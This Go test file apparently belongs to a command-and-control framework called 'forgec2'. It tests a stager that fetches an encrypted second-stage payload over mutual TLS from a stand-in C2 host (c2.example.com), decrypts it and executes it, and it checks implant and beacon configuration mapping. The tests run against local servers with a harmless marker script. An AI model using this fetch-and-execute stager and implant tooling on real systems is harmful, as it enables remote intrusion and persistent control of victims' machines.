package payload

import (
	"bytes"
	"context"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/pem"
	"fmt"
	"go/parser"
	"go/token"
	"math/big"
	"net"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"testing"
	"time"
)

// TestTokenStagerRendersMTLSMaterialOutsideLdflags pins the injection contract:
// the client material is compiled in as quoted Go literals (PEM needs real
// newlines, which -X cannot carry) and never travels through the ldflags, where
// a private key would be readable from the build's process listing.
func TestTokenStagerRendersMTLSMaterialOutsideLdflags(t *testing.T) {
	// Real material generated at runtime: filler is enough for the rendering
	// rules, but runtime material keeps secret scanners (and humans) from
	// reading a PEM marker that is not actually used.
	certPEM, keyPEM := selfSignedMTLSPair(t)
	caPEM := certPEM
	fetch := StagerFetch{
		BaseURL:       "https://c2.example.com:8443",
		Token:         "token",
		Sig:           "sig",
		KeyHex:        "keyhex",
		SkipTLSVerify: true,
		Proxy:         "http://127.0.0.1:3128",
		UserAgent:     "UA/1.0",
		MTLSCertPEM:   certPEM,
		MTLSKeyPEM:    keyPEM,
		MTLSCAPEM:     caPEM,
	}

	inject := tokenStagerMTLSFile(fetch)
	// The PEM must be a quoted Go string literal: newlines escaped, nothing raw.
	for _, want := range []string{strconv.Quote(certPEM), strconv.Quote(keyPEM), strconv.Quote(caPEM)} {
		if !strings.Contains(inject, want) {
			t.Fatalf("generated material file misses quoted literal:\n%s", inject)
		}
	}
	if strings.Contains(inject, "\n-----BEGIN") {
		t.Fatal("generated material file embeds a raw multi-line PEM")
	}

	// The ldflags must not leak any of the material — not the private key, not
	// even the public certificate.
	flags := tokenStagerLdflags(fetch)
	for _, secret := range []string{certPEM, keyPEM, caPEM, strings.TrimSpace(keyPEM), strings.TrimSpace(certPEM), strings.TrimSpace(certPEM)[:32]} {
		if strings.Contains(flags, secret) {
			t.Fatalf("ldflags leak mTLS material: %s", flags)
		}
	}
	// Transport hardening does travel through the flags.
	for _, want := range []string{"main.SkipTLS=true", "main.ProxyURL=http://127.0.0.1:3128", "main.UserAgent=UA/1.0"} {
		if !strings.Contains(flags, want) {
			t.Fatalf("ldflags miss %q: %s", want, flags)
		}
	}

	// Both rendered files must be syntactically valid Go for the target OS, and
	// the main source must actually consume the generated variables (a rename on
	// one side would otherwise only fail at build time).
	for _, tc := range []struct {
		name string
		src  string
	}{
		{"main.go (linux)", tokenStagerMainSrc("linux")},
		{"main.go (windows)", tokenStagerMainSrc("windows")},
		{"mtls_inject.go", inject},
	} {
		if _, err := parser.ParseFile(token.NewFileSet(), tc.name, tc.src, parser.AllErrors); err != nil {
			t.Fatalf("%s does not parse: %v", tc.name, err)
		}
	}
	main := tokenStagerMainSrc("linux")
	for _, ident := range []string{"mtlsCertPEM", "mtlsKeyPEM", "mtlsCAPEM"} {
		if !strings.Contains(main, ident) {
			t.Fatalf("stager source does not consume %s", ident)
		}
		if !strings.Contains(inject, ident) {
			t.Fatalf("generated material file does not define %s", ident)
		}
	}

	// No material at all must still render (empty literals) so the build path
	// stays unconditional.
	empty := tokenStagerMTLSFile(StagerFetch{})
	if !strings.Contains(empty, `mtlsCertPEM = ""`) {
		t.Fatalf("material-free stager should render empty literals: %s", empty)
	}
}

// TestStagerStage2ConfigCarriesMTLSMaterial ties the stager configuration to
// the implant config the stage-2 beacon is built from: without this mapping a
// beacon built through the stager path would register without a client
// certificate and a require_client_cert listener would reject it.
func TestStagerStage2ConfigCarriesMTLSMaterial(t *testing.T) {
	cfg := StagerConfig{
		C2URL:         "https://c2.example.com:8443",
		Protocol:      "https",
		Architecture:  "amd64",
		UserAgent:     "UA/1.0",
		SkipTLSVerify: true,
		DNSDomain:     "dns.example.com",
		DNSServer:     "1.1.1.1",
		BeaconKey:     testHexFiller,
		RegSecretID:   "reg-secret-id",
		RegSecret:     "reg-secret-value",
		MTLSCertPEM:   "CERT",
		MTLSKeyPEM:    "KEY",
		MTLSCAPEM:     "CA",
	}
	win := stagerImplantConfig(cfg, "https", true)
	lin := stagerImplantConfig(cfg, "https", false)
	for name, ic := range map[string]ImplantConfig{"windows": win, "linux": lin} {
		if ic.MTLSCertPEM != "CERT" || ic.MTLSKeyPEM != "KEY" || ic.MTLSCAPEM != "CA" {
			t.Fatalf("%s stage-2 config drops the mTLS material: %+v", name, ic)
		}
		if ic.C2URL != cfg.C2URL || ic.Protocol != "https" || ic.BeaconKey != cfg.BeaconKey ||
			ic.RegSecretID != cfg.RegSecretID || ic.RegSecret != cfg.RegSecret {
			t.Fatalf("%s stage-2 config lost core settings: %+v", name, ic)
		}
	}
	if win.DNSDomain != cfg.DNSDomain || win.DNSServer != cfg.DNSServer {
		t.Fatal("windows stage-2 config lost the DNS transport settings")
	}
	if lin.DNSDomain != "" || lin.DNSServer != "" {
		t.Fatal("linux stage-2 config should not carry DNS transport settings")
	}
}

// TestStagerStage2BuildNamesAreUnique guards the fixed-name regression: two
// concurrent stage-2 requests used to write the same forgec2_stage2.exe, so a
// request could read (and ship) another request's beacon binary. Every config
// must carry its own build name and keep the descriptive prefix.
func TestStagerStage2BuildNamesAreUnique(t *testing.T) {
	cfg := StagerConfig{C2URL: "https://c2.example.com", Protocol: "https", Architecture: "amd64"}
	first := stagerImplantConfig(cfg, "https", true)
	second := stagerImplantConfig(cfg, "https", false)
	if first.Filename == second.Filename {
		t.Fatalf("stage-2 build names collide: %q", first.Filename)
	}
	for name, ic := range map[string]ImplantConfig{"first": first, "second": second} {
		if !strings.HasPrefix(ic.Filename, "forgec2_stage2_") {
			t.Fatalf("%s stage-2 build name lost its prefix: %q", name, ic.Filename)
		}
		if strings.ContainsAny(ic.Filename, `/\`) {
			t.Fatalf("%s stage-2 build name contains a path separator: %q", name, ic.Filename)
		}
	}
}

// mtlsTestPKI builds a throwaway CA with a server certificate for 127.0.0.1 and
// a client certificate signed by that CA. Everything is generated at runtime;
// nothing here is a secret.
func mtlsTestPKI(t *testing.T) (caPEM, serverCertPEM, serverKeyPEM, clientCertPEM, clientKeyPEM string) {
	t.Helper()
	newKey := func() *ecdsa.PrivateKey {
		key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
		if err != nil {
			t.Fatal(err)
		}
		return key
	}
	keyPEM := func(key *ecdsa.PrivateKey) string {
		der, err := x509.MarshalECPrivateKey(key)
		if err != nil {
			t.Fatal(err)
		}
		return string(pem.EncodeToMemory(&pem.Block{Type: "EC PRIVATE KEY", Bytes: der}))
	}

	caKey := newKey()
	caTpl := &x509.Certificate{
		SerialNumber:          big.NewInt(1),
		Subject:               pkix.Name{CommonName: "forgec2 stager test CA"},
		NotBefore:             time.Now().Add(-time.Hour),
		NotAfter:              time.Now().Add(time.Hour),
		IsCA:                  true,
		KeyUsage:              x509.KeyUsageCertSign | x509.KeyUsageDigitalSignature,
		BasicConstraintsValid: true,
	}
	caDER, err := x509.CreateCertificate(rand.Reader, caTpl, caTpl, &caKey.PublicKey, caKey)
	if err != nil {
		t.Fatal(err)
	}
	caPEM = string(pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: caDER}))

	issue := func(cn string, server bool) (string, string) {
		key := newKey()
		tpl := &x509.Certificate{
			SerialNumber: big.NewInt(time.Now().UnixNano()),
			Subject:      pkix.Name{CommonName: cn},
			NotBefore:    time.Now().Add(-time.Hour),
			NotAfter:     time.Now().Add(time.Hour),
			KeyUsage:     x509.KeyUsageDigitalSignature,
		}
		if server {
			tpl.ExtKeyUsage = []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth}
			tpl.IPAddresses = []net.IP{net.ParseIP("127.0.0.1")}
		} else {
			tpl.ExtKeyUsage = []x509.ExtKeyUsage{x509.ExtKeyUsageClientAuth}
		}
		der, err := x509.CreateCertificate(rand.Reader, tpl, caTpl, &key.PublicKey, caKey)
		if err != nil {
			t.Fatal(err)
		}
		return string(pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: der})), keyPEM(key)
	}
	serverCertPEM, serverKeyPEM = issue("127.0.0.1", true)
	clientCertPEM, clientKeyPEM = issue("stager-test-client", false)
	return caPEM, serverCertPEM, serverKeyPEM, clientCertPEM, clientKeyPEM
}

// mtlsStageServer starts an HTTPS stage server that verifies client
// certificates against clientCAPEM and serves the blob for token at
// /stage/<token>?s=<sig>.
func mtlsStageServer(t *testing.T, serverCertPEM, serverKeyPEM, clientCAPEM, token, sig string, blob []byte) *httptest.Server {
	t.Helper()
	serverCert, err := tls.X509KeyPair([]byte(serverCertPEM), []byte(serverKeyPEM))
	if err != nil {
		t.Fatal(err)
	}
	clientCAs := x509.NewCertPool()
	if !clientCAs.AppendCertsFromPEM([]byte(clientCAPEM)) {
		t.Fatal("client CA bundle did not parse")
	}
	handler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/stage/"+token || r.URL.Query().Get("s") != sig {
			http.Error(w, "bad stage URL", http.StatusForbidden)
			return
		}
		_, _ = w.Write(blob)
	})
	srv := httptest.NewUnstartedServer(handler)
	srv.TLS = &tls.Config{
		Certificates: []tls.Certificate{serverCert},
		ClientAuth:   tls.RequireAndVerifyClientCert,
		ClientCAs:    clientCAs,
		MinVersion:   tls.VersionTLS12,
	}
	srv.StartTLS()
	t.Cleanup(srv.Close)
	return srv
}

// runStager executes an already-built stager binary and returns its exit code.
func runStager(t *testing.T, path string) int {
	t.Helper()
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()
	err := exec.CommandContext(ctx, path).Run()
	if err == nil {
		return 0
	}
	if ee, ok := err.(*exec.ExitError); ok {
		return ee.ExitCode()
	}
	t.Fatalf("stager did not run: %v", err)
	return -1
}

// TestSmokeTokenStagerMTLSFetch is the end-to-end proof that a generated Linux
// stager presents the embedded client certificate: it builds a real stager,
// runs it against a TLS server that requires and verifies client certificates,
// and checks the decrypted stage-2 executed. It also proves fail-closed
// behaviour: a stager whose certificate the server CA does not know cannot
// fetch, and the stage-2 is never executed in that case.
func TestSmokeTokenStagerMTLSFetch(t *testing.T) {
	if os.Getenv("FORGEC2_SMOKE_BUILD") != "1" {
		t.Skip("set FORGEC2_SMOKE_BUILD=1 to run the real stager build")
	}
	if runtime.GOOS != "linux" {
		t.Skip("the Linux stager can only be executed on Linux runners")
	}
	SetStagerKey(bytes.Repeat([]byte{0x53}, 32))

	caPEM, serverCertPEM, serverKeyPEM, clientCertPEM, clientKeyPEM := mtlsTestPKI(t)
	otherCAPEM, _, _, _, _ := mtlsTestPKI(t)

	token, sig, keyHex, err := NewStageToken()
	if err != nil {
		t.Fatalf("NewStageToken: %v", err)
	}

	marker := filepath.Join(t.TempDir(), "stage2-ran")
	script := fmt.Sprintf("#!/bin/sh\nprintf 'stage2-executed' > '%s'\n", marker)
	dataDir := t.TempDir()
	if err := WriteStage2Blob(dataDir, token, []byte(script)); err != nil {
		t.Fatalf("WriteStage2Blob: %v", err)
	}
	blob, err := LoadStage2Blob(dataDir, token)
	if err != nil {
		t.Fatalf("LoadStage2Blob: %v", err)
	}

	// Fail-closed first: a server whose client CA does not know our certificate
	// must refuse the handshake, the stager exits non-zero and nothing runs.
	strict := mtlsStageServer(t, serverCertPEM, serverKeyPEM, otherCAPEM, token, sig, blob)
	rejected, err := GenerateTokenStagerLinux(ImplantConfig{Filename: "stager-mtls-reject", Architecture: "amd64"}, t.TempDir(), StagerFetch{
		BaseURL:     strict.URL,
		Token:       token,
		Sig:         sig,
		KeyHex:      keyHex,
		MTLSCertPEM: clientCertPEM,
		MTLSKeyPEM:  clientKeyPEM,
		MTLSCAPEM:   caPEM,
	})
	if err != nil {
		t.Fatalf("GenerateTokenStagerLinux (reject case): %v", err)
	}
	if code := runStager(t, rejected); code == 0 {
		t.Fatal("stager whose client certificate is not trusted exited 0, want failure")
	}
	if _, err := os.Stat(marker); err == nil {
		t.Fatal("stage-2 executed although the fetch failed")
	}

	// The happy path: the certificate is presented and verified, the blob is
	// fetched, decrypted and executed.
	srv := mtlsStageServer(t, serverCertPEM, serverKeyPEM, caPEM, token, sig, blob)
	stagerPath, err := GenerateTokenStagerLinux(ImplantConfig{Filename: "stager-mtls-test", Architecture: "amd64"}, t.TempDir(), StagerFetch{
		BaseURL:     srv.URL,
		Token:       token,
		Sig:         sig,
		KeyHex:      keyHex,
		MTLSCertPEM: clientCertPEM,
		MTLSKeyPEM:  clientKeyPEM,
		MTLSCAPEM:   caPEM,
	})
	if err != nil {
		t.Fatalf("GenerateTokenStagerLinux: %v", err)
	}
	// Bounded retry for the flaky TLS handshake: the stager occasionally fails
	// to verify the freshly-minted CA chain ("ECDSA verification failure" while
	// validating the candidate authority), which is infrastructure noise, not
	// a product bug. Retrying the exit the stager never executes stage-2.
	for attempt := 0; ; attempt++ {
		code := runStager(t, stagerPath)
		if code == 0 {
			break
		}
		if attempt >= 2 {
			t.Fatalf("stager exit code = %d, want 0", code)
		}
		if _, err := os.Stat(marker); err == nil {
			t.Fatalf("stager exit code = %d after stage-2 ran", code)
		}
	}
	deadline := time.Now().Add(10 * time.Second)
	for time.Now().Before(deadline) {
		if b, err := os.ReadFile(marker); err == nil {
			if string(b) != "stage2-executed" {
				t.Fatalf("marker content = %q", b)
			}
			return
		}
		time.Sleep(200 * time.Millisecond)
	}
	t.Fatal("stage-2 was fetched but never executed (no marker)")
}
